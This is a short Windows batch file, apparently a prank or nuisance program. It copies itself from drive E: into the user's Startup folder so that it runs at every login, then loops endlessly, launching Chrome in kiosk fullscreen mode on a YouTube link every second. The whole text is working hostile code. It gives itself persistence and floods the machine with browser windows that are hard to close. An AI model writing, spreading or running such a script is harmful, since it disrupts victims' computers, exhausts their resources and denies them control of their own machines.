
@echo off
copy /y "E:\WELIVEWELOVEWELIE.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:x
start "" "chrome" --kiosk --fullscreen --incognito "https://youtu.be/QxYpiBlHr1w?si=ldxvQ46jo002Gjhb"
timeout /t 1 /nobreak
goto x